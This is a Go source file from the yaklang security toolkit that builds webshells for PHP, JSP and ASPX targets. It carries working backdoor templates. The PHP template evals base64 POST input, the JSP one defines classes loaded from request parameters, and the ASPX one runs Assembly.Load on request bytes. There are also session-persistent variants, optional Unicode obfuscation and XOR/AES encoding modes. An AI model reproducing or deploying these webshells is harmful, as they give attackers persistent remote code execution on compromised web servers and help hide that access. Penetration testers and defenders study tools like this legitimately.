package wsm

import (
	"fmt"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
)

// WsGenerate 生成

type GenerateConfig func(generate *ypb.ShellGenerate)
type ConfuseFunc func(code string) (string, error)

func NewGenerate(opt ...GenerateConfig) *Generate {
	y := new(ypb.ShellGenerate)
	for _, config := range opt {
		config(y)
	}
	switch y.Script {
	case ypb.ShellScript_PHP:
		return newPhpGenerate(y)
	case ypb.ShellScript_JSP:
		return newJspGenerate(y)
	case ypb.ShellScript_ASPX:
		return newAspxGenerate(y)
	}
	return nil
}

/*
WithEncMode 加密模式，和ypb里面对应

	EncMode_Raw       EncMode = 0
	EncMode_Base64    EncMode = 1
	EncMode_AesRaw    EncMode = 2
	EncMode_AesBase64 EncMode = 3
	EncMode_XorRaw    EncMode = 4
	EncMode_XorBase64 EncMode = 5
*/

func WithXorBase64() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.EncMode = ypb.EncMode_XorBase64
	}
}
func WithXorRaw() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.EncMode = ypb.EncMode_XorRaw
	}
}
func WithPhpScript() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.Script = ypb.ShellScript_PHP
	}
}
func WithJspScript() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.Script = ypb.ShellScript_JSP
	}
}
func WithAspxScript() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.Script = ypb.ShellScript_ASPX
	}
}
func WithAesBase64() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.EncMode = ypb.EncMode_AesBase64
	}
}
func WithBase64() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.EncMode = ypb.EncMode_Base64
	}
}
func WithPass(pass string) GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.Pass = pass
	}
}
func WithConfuse() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.Confuse = true
	}
}
func WithSessionMode() GenerateConfig {
	return func(generate *ypb.ShellGenerate) {
		generate.IsSession = true
	}
}

type Generate struct {
	header string
	decode string

	memberLabelLeft   string
	memberLabelRight  string
	serviceLabelLeft  string
	serviceLabelRight string

	memberDecl  string
	serviceDecl string
	pass        string
	confuseFunc ConfuseFunc
}

func (j *Generate) Generate() (string, error) {
	var code string
	service, err := j.confuseFunc(fmt.Sprintf(j.serviceDecl, j.pass))
	if err != nil {
		return "", err
	}
	code = j.header + "\n" + j.memberLabelLeft + "\n" + j.memberDecl + "\n" + j.decode + fmt.Sprintf("\n%s\n", j.memberLabelRight) + fmt.Sprintf("%s\n", j.serviceLabelLeft) + service + fmt.Sprintf("\n%s", j.serviceLabelRight)
	return code, nil
}

func newJspGenerate(generate *ypb.ShellGenerate) *Generate {
	jspGenerate := getDefaultCustomJspGenerate()
	if generate.Confuse {
		jspGenerate.confuseFunc = confuseFuncWithUnicode()
	}
	jspGenerate.pass = generate.Pass
	if generate.IsSession {
		jspGenerate.serviceDecl = `String pass = "%v";
    if (request.getParameter("1") != null) {
        if (session.getAttribute("RPOAMXO") != null) {
            session.getAttribute("RPOAMXO").equals(new Object[]{
                    request,
                    response,
                    session,
                    new String(decrypt(request.getParameter(pass)))
            });
        } else {
            session.setAttribute("RPOAMXO", new U(Thread.currentThread().getContextClassLoader()).g(decrypt(request.getParameter(pass))).newInstance());
        }
    }`
	}
	return jspGenerate
}
func newPhpGenerate(generate *ypb.ShellGenerate) *Generate {
	phpGenerate := getDefaultPhpCustomGenerate()
	if generate.Confuse {
		//todo
		//phpGenerate.confuseFunc = confuseFuncWithUnicode()
	}
	phpGenerate.pass = generate.Pass
	if generate.IsSession {
		phpGenerate.memberDecl = `error_reporting(0);
set_time_limit(0);
ini_set("session.gc_maxlifetime", 3600 * 3600);
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
@session_start();`
		phpGenerate.serviceDecl = `$pass = "%v";
$payloadName = 'DJAODJAIOAJCMA';
if (isset($_POST[$pass])) {
    if (!isset($_SESSION[$payload])) {
        $_SESSION[$payload] = $_POST[$pass];
    }else{
        eval(decrypt($_SESSION[$payload],$pass));
    }
}`
	}
	return phpGenerate
}
func newAspxGenerate(generate *ypb.ShellGenerate) *Generate {
	aspxWebShellGenerate := getDefaultAspxWebShellGenerate()
	if generate.Confuse {
	}
	aspxWebShellGenerate.pass = generate.Pass
	if generate.IsSession {
		aspxWebShellGenerate.serviceDecl = `String data = Request.Form["%v"];
 if (data != null) {
     String payload = Encoding.UTF8.GetString(Convert.FromBase64String(data));
     if (Session["payload"] == null)
     {
         Session["payload"]=System.Reflection.Assembly.Load(Convert.FromBase64String(data)).CreateInstance("Payload");
         Session["payload"].Equals(new object[] { this, Convert.FromBase64String(data) });
     }
     else {
         Session["payload"].Equals(new object[] { this,payload});
     }
 }`
	}
	return aspxWebShellGenerate
}

func confuseFuncWithUnicode() ConfuseFunc {
	return func(code string) (string, error) {
		return codec.JsonUnicodeEncode(code), nil
	}
}

func getDefaultCustomJspGenerate() *Generate {
	return &Generate{
		memberLabelLeft:   "<%!",
		memberLabelRight:  "%>",
		serviceLabelLeft:  "<%",
		serviceLabelRight: "%>",
		header:            `<%@ page trimDirectiveWhitespaces="true" %>`,
		decode: `private static byte[] decrypt(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        } else {
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            result = (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
        }
        return result;
    }`,
		memberDecl: `class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }`,
		serviceDecl: `new U(Thread.currentThread().getContextClassLoader()).g(decrypt(request.getParameter("%v"))).newInstance().equals(pageContext);`,
		confuseFunc: func(code string) (string, error) {
			return code, nil
		},
	}
}
func getDefaultPhpCustomGenerate() *Generate {
	return &Generate{
		header: "<?",
		decode: `function decrypt($data, $key)
{
    return base64_decode($data, $key);
}`,
		memberLabelLeft:   "",
		memberLabelRight:  "",
		serviceLabelLeft:  "",
		serviceLabelRight: "",
		memberDecl:        `error_reporting(0);`,
		serviceDecl: `$pass = "%v";
eval(base64_decode($_POST[$pass],$pass));
`,
		confuseFunc: func(code string) (string, error) {
			return code, nil
		},
	}
}

func getDefaultAspxWebShellGenerate() *Generate {
	return &Generate{
		header: `<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection" %>`,
		serviceLabelLeft:  "<%",
		serviceLabelRight: "%>",
		serviceDecl: `var a = Convert.FromBase64String(Request["%v"]);
   Assembly myAssebly = System.Reflection.Assembly.Load(a);
   myAssebly.CreateInstance("Payload").Equals(new object[] {this,a});`,
		confuseFunc: func(code string) (string, error) {
			return code, nil
		},
	}
}
